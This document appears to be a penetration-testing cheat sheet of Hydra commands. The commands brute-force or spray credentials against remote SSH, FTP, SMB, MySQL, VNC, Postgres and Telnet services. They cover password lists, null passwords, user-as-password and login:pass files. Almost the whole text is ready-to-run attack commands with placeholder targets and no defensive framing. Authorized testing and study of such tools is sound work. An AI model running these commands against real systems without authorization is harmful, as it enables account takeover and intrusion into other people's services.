# Hydra

% bruteforce, access

## Hydra - ssh - userlist and password list - 22
#platform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
hydra -L <userlist> -P <passlist> <ip> ssh 
```

## Hydra - ssh - user and password  - 22
#platform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
hydra -l <user|root> -p <password|root> <ip> ssh 
```

## Hydra - ssh - user=password - 22
#platform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -e s <ip> ssh 
```

## Hydra - ssh - null password - 22
#platform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -l <user|root> -e n <ip> ssh 
```

## Hydra - ssh - password=reverseuser - 22
#platform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -e r <ip> ssh 
```

## Hydra - ssh - file "login:pass" format - specify port
#platform/linux #target/remote #protocol/ssh #port/custom #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -t 4 -s <port> -C <file_login_pass> <ip> ssh 
```

## Hydra - ftp - 21 
#protocol/ftp #port/21 #platform/linux #target/remote  #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> ftp 
```

## Hydra - smb - 445
#protocol/smb #port/445 #platform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> smb
```

## Hydra - mysql - 3306
#protocol/mysql #port/3306 #platform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> mysql 
```

## Hydra - vnc - 5900
#protocol/vnc #port/5900 #platform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> vnc 
```

## Hydra - postgres - 5432
#protocol/postgres #port/5432 #platform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> postgres
```

## Hydra - telnet - 23
#protocol/telnet #port/23 #platform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> telnet 
```

= userlist: users.txt
= passlist: pass.txt
